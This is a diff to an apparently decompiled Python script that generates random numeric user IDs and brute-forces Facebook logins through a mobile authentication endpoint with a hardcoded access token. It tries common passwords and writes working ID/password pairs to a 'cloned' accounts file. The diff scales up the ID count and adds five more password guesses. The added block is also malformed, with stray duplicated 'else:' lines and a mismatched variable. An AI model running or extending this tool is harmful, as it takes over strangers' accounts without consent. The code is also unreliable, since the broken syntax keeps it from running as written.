@@ -6,7 +6,7 @@
 # Embedded file name: dg
 import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, time
 os.system('rm -rf .txt')
-for n in range(30000):
+for n in range(300000):
     nmbr = random.randint(111111111, 999999999)
     sys.stdout = open('.txt', 'a')
     print nmbr
@@ -288,6 +288,91 @@ def action():
                                 cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass5 + '\n')
                                 cps.close()
                                 cpb.append(c + user + pass5)
+                       else:
+                        pass6 = '1122334455'
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\x1b[1;92m\xe2\x95\x94[OK PASHAM] \x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass6
+                            okb = open('save/cloned.txt', 'a')
+                            okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass6 + '\n')
+                            okb.close()
+                            oks.append(c + user + pass4)
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;36;40m\xe2\x95\x94[CP PASHAM] \x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass6
+                            cps = open('save/cloned.txt', 'a')
+                            cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass6 + '\n')
+                            cps.close()
+                            cpb.append(c + user + pass6)
+                        else:            
+                        	   else:
+                        pass7 = 'DANAR2005'
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\x1b[1;92m\xe2\x95\x94[OK PASHAM] \x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass7
+                            okb = open('save/cloned.txt', 'a')
+                            okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass7 + '\n')
+                            okb.close()
+                            oks.append(c + user + pass7)
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;36;40m\xe2\x95\x94[CP PASHAM] \x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass7
+                            cps = open('save/cloned.txt', 'a')
+                            cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass7 + '\n')
+                            cps.close()
+                            cpb.append(c + user + pass7)
+                        else:
+                        	   else:
+                        pass8 = '12345678'
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\x1b[1;92m\xe2\x95\x94[OK PASHAM] \x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass8
+                            okb = open('save/cloned.txt', 'a')
+                            okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass8 + '\n')
+                            okb.close()
+                            oks.append(c + user + pass8)
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;36;40m\xe2\x95\x94[CP PASHAM] \x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass8
+                            cps = open('save/cloned.txt', 'a')
+                            cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass8 + '\n')
+                            cps.close()
+                            cpb.append(c + user + pass8)
+                        else:
+                        	   else:
+                        pass9 = 'HAMA2005'
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\x1b[1;92m\xe2\x95\x94[OK PASHAM] \x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass9
+                            okb = open('save/cloned.txt', 'a')
+                            okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass9 + '\n')
+                            okb.close()
+                            oks.append(c + user + pass9)
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;36;40m\xe2\x95\x94[CP PASHAM] \x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass9
+                            cps = open('save/cloned.txt', 'a')
+                            cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass9 + '\n')
+                            cps.close()
+                            cpb.append(c + user + pass9)
+                        else:
+                        	   else:
+                        pass10 = 'HAMA123456'
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\x1b[1;92m\xe2\x95\x94[OK PASHAM] \x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass10
+                            okb = open('save/cloned.txt', 'a')
+                            okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass10 + '\n')
+                            okb.close()
+                            oks.append(c + user + pass10)
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;36;40m\xe2\x95\x94[CP PASHAM] \x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass10
+                            cps = open('save/cloned.txt', 'a')
+                            cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass10 + '\n')
+                            cps.close()
+                            cpb.append(c + user + pass10)
+                        else:
         except:
             pass
 
